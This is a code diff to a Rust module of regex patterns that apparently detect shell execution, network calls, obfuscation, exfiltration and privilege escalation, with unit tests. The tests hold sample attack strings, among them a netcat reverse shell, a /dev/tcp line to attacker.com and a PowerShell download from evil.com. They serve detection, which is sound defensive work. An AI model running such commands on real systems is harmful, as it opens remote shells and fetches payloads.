@@ -20,6 +20,15 @@ pub static SHELL_EXEC_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
         Regex::new(r"subprocess\.(run|call|Popen|check_output)").unwrap(),
         Regex::new(r"os\.system\s*\(").unwrap(),
         Regex::new(r"\beval\s*\(\s*`").unwrap(),
+        // PowerShell
+        Regex::new(r"(?i)Invoke-Expression").unwrap(),
+        Regex::new(r"(?i)-EncodedCommand").unwrap(),
+        // Rust shell exec
+        Regex::new(r"std::process::Command").unwrap(),
+        Regex::new(r"Command::new\s*\(").unwrap(),
+        // Go shell exec
+        Regex::new(r"os/exec").unwrap(),
+        Regex::new(r"exec\.Command\s*\(").unwrap(),
     ]
 });
 
@@ -35,6 +44,9 @@ pub static NETWORK_CALL_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
         Regex::new(r"XMLHttpRequest").unwrap(),
         Regex::new(r#"\.open\s*\(\s*['"]https?:"#).unwrap(),
         Regex::new(r"urllib").unwrap(),
+        // PowerShell
+        Regex::new(r"(?i)Invoke-WebRequest").unwrap(),
+        Regex::new(r"(?i)Invoke-RestMethod").unwrap(),
     ]
 });
 
@@ -117,6 +129,13 @@ pub static OBFUSCATION_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
         Regex::new(r#"require\s*\(\s*[^'"]"#).unwrap(),
         Regex::new(r"importlib\.import_module").unwrap(),
         Regex::new(r"__import__").unwrap(),
+        // Multi-stage payloads
+        Regex::new(r"document\.write\s*\(").unwrap(),
+        Regex::new(r"\.innerHTML\s*=").unwrap(),
+        // Template literal eval
+        Regex::new(r"\beval\s*\(\s*`").unwrap(),
+        // Unicode obfuscation: zero-width characters
+        Regex::new(r"[\u{200B}\u{200C}\u{200D}\u{FEFF}]").unwrap(),
     ]
 });
 
@@ -124,7 +143,8 @@ pub static OBFUSCATION_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
 pub static EXFILTRATION_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
     vec![
         Regex::new(r#"\.(post|put)\s*\(\s*['"]https?://"#).unwrap(),
-        Regex::new(r#"(?s)fetch\s*\(\s*['"]https?://[^'"]*['"],\s*\{[^}]*method:\s*['"]POST"#).unwrap(),
+        Regex::new(r#"(?s)fetch\s*\(\s*['"]https?://[^'"]*['"],\s*\{[^}]*method:\s*['"]POST"#)
+            .unwrap(),
         Regex::new(r"(?i)\bwebhook\b").unwrap(),
         Regex::new(r"curl\s+(-X\s+POST|--data)").unwrap(),
     ]
@@ -147,40 +167,31 @@ pub static EXTERNAL_DOWNLOAD_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)https?://.*\.(exe|msi|dmg|zip|tar|sh|bin|deb|rpm)\b").unwrap()
 });
 
-pub static CURL_DOWNLOAD_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)curl.*-[oO]|wget.*-O").unwrap()
-});
+pub static CURL_DOWNLOAD_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)curl.*-[oO]|wget.*-O").unwrap());
 
 /// Privilege escalation patterns
-pub static PRIV_ESC_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)\bsudo\b|chmod\s+(\+x|777|755)|chown\s+root").unwrap()
-});
+pub static PRIV_ESC_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)\bsudo\b|chmod\s+(\+x|777|755)|chown\s+root").unwrap());
 
 /// Dependency patterns
-pub static NPM_INSTALL_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"npm\s+install\s+").unwrap()
-});
+pub static NPM_INSTALL_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"npm\s+install\s+").unwrap());
 
-pub static PIP_INSTALL_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"pip\s+install\s+").unwrap()
-});
+pub static PIP_INSTALL_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"pip\s+install\s+").unwrap());
 
-pub static CARGO_ADD_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"cargo\s+add\s+").unwrap()
-});
+pub static CARGO_ADD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"cargo\s+add\s+").unwrap());
 
-pub static REQUIRE_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"require\s*\(\s*['"][^./]"#).unwrap()
-});
+pub static REQUIRE_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#"require\s*\(\s*['"][^./]"#).unwrap());
 
-pub static IMPORT_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"from\s+\S+\s+import|import\s+\S+").unwrap()
-});
+pub static IMPORT_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"from\s+\S+\s+import|import\s+\S+").unwrap());
 
 /// Password-protected archive patterns
-pub static ARCHIVE_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)\.(zip|rar|7z)\b").unwrap()
-});
+pub static ARCHIVE_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)\.(zip|rar|7z)\b").unwrap());
 
 // ---------------------------------------------------------------------------
 // Helper functions
@@ -215,5 +226,30 @@ mod tests {
         assert!(any_match("nc -e /bin/sh", &REVERSE_SHELL_RE));
         assert!(any_match("/dev/tcp/attacker.com/4444", &REVERSE_SHELL_RE));
         assert!(!any_match("normal command", &REVERSE_SHELL_RE));
+    }
+
+    #[test]
+    fn test_powershell_patterns() {
+        let text = "Invoke-Expression $payload";
+        assert!(count_matches(text, &SHELL_EXEC_RE) > 0);
+
+        let text = "powershell -EncodedCommand ZQBj...";
+        assert!(count_matches(text, &SHELL_EXEC_RE) > 0);
+
+        let text = "Invoke-WebRequest https://evil.com/payload";
+        assert!(count_matches(text, &NETWORK_CALL_RE) > 0);
+    }
+
+    #[test]
+    fn test_rust_go_shell_exec_patterns() {
+        assert!(count_matches("std::process::Command::new(\"sh\")", &SHELL_EXEC_RE) > 0);
+        assert!(count_matches("Command::new(\"bash\")", &SHELL_EXEC_RE) > 0);
+        assert!(count_matches("exec.Command(\"sh\")", &SHELL_EXEC_RE) > 0);
+    }
+
+    #[test]
+    fn test_multi_stage_payload_patterns() {
+        assert!(count_matches("document.write('<script>evil()</script>')", &OBFUSCATION_RE) > 0);
+        assert!(count_matches("el.innerHTML = payload", &OBFUSCATION_RE) > 0);
     }
 }
